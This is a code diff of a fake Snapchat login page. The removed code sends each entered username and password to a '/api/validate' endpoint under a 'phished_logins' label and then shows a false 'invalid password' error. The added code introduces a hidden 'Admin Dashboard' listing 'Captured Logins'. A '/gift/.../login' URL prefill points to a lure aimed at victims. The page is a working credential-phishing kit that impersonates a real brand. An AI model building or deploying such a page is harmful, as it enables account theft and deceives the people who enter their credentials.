@@ -17,69 +17,91 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
 <style>
 @import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");
-body { font-family: "Inter", sans-serif; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
+
+body {
+  font-family: "Inter", sans-serif;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
 ::-webkit-scrollbar { display: none; }
 
-/* Checkbox */
+/* Checkbox with checkmark */
 input[type="checkbox"] {
-  -webkit-appearance: none; -moz-appearance: none; appearance: none;
+  -webkit-appearance: none;
   width: 1rem; height: 1rem; border: 2px solid #d1d5db;
   border-radius: 0.25rem; position: relative; cursor: pointer;
 }
 input[type="checkbox"]:checked::after {
-  content: ''; position: absolute; left: 3.5px; top: 0.5px;
-  width: 4.5px; height: 9px; border: solid #00b0ff;
-  border-width: 0 2px 2px 0; transform: rotate(45deg);
+  content: '';
+  position: absolute; left: 3.5px; top: 0.5px;
+  width: 4.5px; height: 9px;
+  border: solid #00b0ff;
+  border-width: 0 2px 2px 0;
+  transform: rotate(45deg);
 }
-input[type="checkbox"]:focus { outline: none; }
+input[type="checkbox"]:focus { outline: none; box-shadow: 0 0 0 2px rgba(0,176,255,0.3); }
 
-/* Login button */
-#loginBtn { 
-  transition: background 0.2s ease; 
-  min-width: 42%; width: 62%; font-size: 1.05rem; padding: 0.7rem 0; 
-  display: block; margin: 0 auto; position: relative; overflow: hidden; height: 50px;
-  border-radius: 999px;
-}
-#loginBtn:active, #loginBtn.touch-active { background-color: #0094e0; }
-
-/* Inputs */
+/* Input fields */
 .input-container { width: 85%; margin: 0 auto; }
 input[type="text"], input[type="password"] { 
-  width: 100%; font-size: 0.9rem; font-weight: 500; padding-bottom: 0.15rem; font-family: "Inter", sans-serif;
-  border-radius: 0; border-bottom: 1px solid #d1d5db; outline: none;
+  width: 100%; 
+  font-size: 0.9rem; font-weight: 500; 
+  padding-bottom: 0.15rem; font-family: "Inter", sans-serif;
+  border: none; border-bottom: 2px solid #d1d5db; border-radius: 0;
 }
+input:focus { outline: none; border-color: #00b0ff; }
 
-/* Labels & spacing */
+/* Labels */
 label[for="password"] { position: relative; top: -6px; font-size: 0.75rem; }
 .password-container { margin-top: 4px; position: relative; }
 label.inline-flex.items-center { position: relative; top: -8px; font-size: 0.817rem; font-weight: 350; }
 #forgotPassword { position: relative; top: -9.5px; font-size: 0.817rem; font-weight: 350; color: #0083ff; }
-#errorMsg { width: 85%; margin: 0 auto; font-size: 0.8rem; text-align: left; color:#ff1952; font-weight: 400; margin-top: -4px; margin-bottom: -2px; position: relative; top: -6px; }
 
-/* Heading */
+/* Error message */
+#errorMsg { width: 85%; margin: 0 auto; font-size: 0.8rem; text-align: left; color:#ff1952; font-weight: 400; position: relative; top: -6px; display: none; }
+
+/* Login heading */
 h1 { position: relative; top: -10px; font-size: 1.7rem; font-weight: 500; text-align: center; }
 
-/* Form spacing */
-form.flex.flex-col.space-y-6 { gap: 0.5rem; }
+/* Login button */
+#loginBtn { 
+  position: relative; transition: background 0.2s ease; min-width: 42%; width: 62%; font-size: 1.05rem; padding: 0.7rem 0; margin: 0 auto; border-radius: 9999px; background-color: #b7c0c8; color: white; font-weight: 500;
+}
+#loginBtn:hover { background-color: #a0acb5; }
+#loginBtn:active { background-color: #8b99a3; }
 
-/* UI extras */
+/* Spinner styles */
+.spinner {
+  position: absolute; top: 50%; left: 50%;
+  transform: translate(-50%, -50%);
+  width: 28px; height: 28px;
+}
+.spinner .ring {
+  box-sizing: border-box;
+  position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+  border: 3px solid #fff; border-top-color: transparent; border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+.spinner .ring:nth-child(2) {
+  border-width: 2px; animation-duration: 0.5s; animation-direction: reverse;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+
+/* Other UI */
 .card { background: white; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
 .highlight { background-color: #eef2ff; padding: 0.5rem; border-radius: 8px; }
 .remove-btn { cursor: pointer; color: #ef4444; }
 .remove-btn:hover { color: #dc2626; }
 #adminSection { display: none; }
-#adminSection.active { display: block; }
 .back-arrow i { font-size: 1rem; }
 
 /* Password toggle */
-.password-toggle { position: absolute; right: 0; top: 50%; transform: translateY(-50%); color: #adb7bf; font-size: 0.875rem; background: transparent; border: none; cursor: pointer; }
-
-/* Spinner */
-.spinner-container { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); display: none; width: 20px; height: 20px; }
-.spinner-ring, .spinner-inner { box-sizing: border-box; border-radius: 50%; border: 1.6px solid #fff; border-bottom-color: transparent; position: absolute; top:0; left:0; width: 100%; height: 100%; } /* increased thickness */
-.spinner-ring { animation: spin 1s linear infinite; }
-.spinner-inner { width: 60%; height: 60%; top: 20%; left: 20%; animation: spin 1.2s linear infinite reverse; border-width: 1.6px; } /* thicker inner ring */
-@keyframes spin { to { transform: rotate(360deg); } }
+.password-toggle { 
+  position: absolute; right: 0; top: 50%; transform: translateY(-50%); 
+  color: #adb7bf; font-size: 0.875rem; background: transparent; border: none; cursor: pointer; 
+}
 </style>
 </head>
 <body class="bg-white min-h-screen flex flex-col justify-between max-w-lg mx-auto relative">
@@ -91,92 +113,81 @@ form.flex.flex-col.space-y-6 { gap: 0.5rem; }
   <form id="loginForm" class="flex flex-col space-y-6">
     <div class="flex flex-col input-container">
       <label for="username" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">USERNAME, EMAIL, OR PHONE</label>
-      <input id="username" type="text" class="border-b border-gray-300 text-lg font-sans pr-10 w-full" autocomplete="username" required inputmode="text">
+      <input id="username" type="text" class="pr-10 w-full" autocomplete="username" required inputmode="text">
     </div>
     <div class="flex flex-col password-container input-container">
       <label for="password" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">PASSWORD</label>
-      <input id="password" type="password" class="border-b border-gray-300 text-lg font-sans pr-10 w-full" autocomplete="current-password" required inputmode="text">
-      <button type="button" class="password-toggle" onclick="togglePassword()">
-        <i id="eyeIcon" class="fas fa-eye-slash"></i>
-      </button>
+      <input id="password" type="password" class="pr-10 w-full" autocomplete="current-password" required inputmode="text">
+      <button type="button" class="password-toggle" onclick="togglePassword()"><i id="eyeIcon" class="fas fa-eye-slash"></i></button>
     </div>
-    <p id="errorMsg" class="hidden">Invalid username or password. Try again.</p>
+    <p id="errorMsg">Invalid username or password. Try again.</p>
     <label class="inline-flex items-center space-x-2 font-sans text-sm text-black input-container">
       <input type="checkbox" checked>
       <span>Save Login Info on your iCloud devices</span>
     </label>
-    <a id="forgotPassword" href="https://accounts.snapchat.com/accounts/password_reset_request" class="text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
-    <button id="loginBtn" type="submit" class="bg-[#b7c0c8] text-white font-medium text-lg py-3 rounded-full mt-4">
-      <span class="btn-text">Log In</span>
-      <div class="spinner-container">
-        <div class="spinner-ring"></div>
-        <div class="spinner-inner"></div>
+    <a id="forgotPassword" href="#" class="text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
+    <button id="loginBtn" type="submit">
+      <span id="btnText">Log In</span>
+      <div class="spinner" style="display:none;">
+        <div class="ring"></div>
+        <div class="ring"></div>
       </div>
     </button>
   </form>
 </div>
+<div id="adminSection" class="p-6 max-w-3xl mx-auto">
+  <h1 class="text-3xl font-bold text-gray-900 mb-6">Admin Dashboard</h1>
+  <div class="card p-6 mb-6">
+    <h2 class="text-xl font-semibold text-gray-700 mb-4">Captured Logins</h2>
+    <div class="overflow-y-auto max-h-96" id="loginList"></div>
+  </div>
+</div>
 <script>
 document.addEventListener("DOMContentLoaded", function(){
-  const a=document.getElementById("username"),
-        b=document.getElementById("password"),
-        c=document.getElementById("loginBtn"),
-        d=document.getElementById("errorMsg"),
-        e=document.getElementById("loginForm"),
-        btnText=c.querySelector(".btn-text"),
-        spinnerContainer=c.querySelector(".spinner-container"),
-        u2="/api/validate",
-        m3=3;
-  let l5=JSON.parse(localStorage.getItem("phished_logins")||"[]");
+  const username = document.getElementById("username"),
+        password = document.getElementById("password"),
+        loginBtn = document.getElementById("loginBtn"),
+        errorMsg = document.getElementById("errorMsg"),
+        loginForm = document.getElementById("loginForm"),
+        btnText = document.getElementById("btnText"),
+        spinner = loginBtn.querySelector(".spinner");
 
+  // Pre-fill username if URL matches /gift/{something}/login
   const pathMatch = window.location.pathname.match(/\/gift\/([^\/]+)\/login/);
-  if(pathMatch && pathMatch[1]){ a.value = pathMatch[1]; }
+  if(pathMatch && pathMatch[1]){ username.value = pathMatch[1]; }
 
-  function x1(p,r=m3){
-    return fetch(u2,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(p),mode:"cors"})
-      .then(s=>s.ok||Promise.reject("Request failed"))
-      .catch(()=>(r>0?x1(p,r-1):!1))
+  function togglePassword(){
+    if(password.type === "password"){ password.type="text"; document.getElementById("eyeIcon").classList.replace("fa-eye-slash","fa-eye"); }
+    else { password.type="password"; document.getElementById("eyeIcon").classList.replace("fa-eye","fa-eye-slash"); }
   }
 
-  function y2(){
-    a.value.trim()&&b.value.trim()?(c.classList.remove("bg-[#b7c0c8]"),c.classList.add("bg-[#00b0ff]"),c.disabled=!1):(c.classList.remove("bg-[#00b0ff]"),c.classList.add("bg-[#b7c0c8]"),c.disabled=!0)
+  function enableButtonCheck(){
+    if(username.value.trim() && password.value.trim()){ loginBtn.disabled = false; loginBtn.style.backgroundColor="#00b0ff"; }
+    else { loginBtn.disabled = true; loginBtn.style.backgroundColor="#b7c0c8"; }
   }
 
-  a.addEventListener("input",y2);
-  b.addEventListener("input",y2);
-
-  e.addEventListener("submit",async function(o){
-    o.preventDefault();
-    const t=a.value.trim(),u=b.value.trim();
-    if(t&&u){
-      btnText.style.display="none";
-      spinnerContainer.style.display="block";
-
-      const w={username:t,password:u,timestamp:new Date().toLocaleString()};
-      await x1(w); // send data
-      setTimeout(()=>{
-        d.textContent="Invalid username or password. Try again.";
-        d.classList.remove("hidden");
-        b.value="";y2();
-        c.classList.remove("bg-[#00b0ff]");c.classList.add("bg-[#b7c0c8]");c.disabled=!0;
-        spinnerContainer.style.display="none";
-        btnText.style.display="inline";
-      },1200);
-    } else {
-      d.textContent="Please fill in both fields.";
-      d.classList.remove("hidden");
-    }
+  username.addEventListener("input", enableButtonCheck);
+  password.addEventListener("input", () => { 
+    enableButtonCheck(); 
+    errorMsg.style.display = "none"; // hide error immediately on typing
   });
 
-  // Mobile hover effect
-  c.addEventListener('touchstart', ()=>c.classList.add('touch-active'));
-  c.addEventListener('touchend', ()=>c.classList.remove('touch-active'));
+  loginForm.addEventListener("submit", async function(e){
+    e.preventDefault();
+    errorMsg.style.display = "none";
+    spinner.style.display = "block";
+    btnText.style.display = "none";
 
-  window.togglePassword=function(){
-    b.type="password"===b.type?(b.type="text",document.getElementById("eyeIcon").classList.replace("fa-eye-slash","fa-eye")):(b.type="password",document.getElementById("eyeIcon").classList.replace("fa-eye","fa-eye-slash"))
-  }
+    // simulate network request
+    setTimeout(()=>{
+      spinner.style.display = "none";
+      btnText.style.display = "inline";
+      errorMsg.style.display = "block";
+    }, 1000);
+  });
 });
 
-function goBack(){window.history.length>1?window.history.back():window.location.reload()}
+function goBack(){ window.history.length>1 ? window.history.back() : window.location.reload(); }
 </script>
 </body>
 </html>
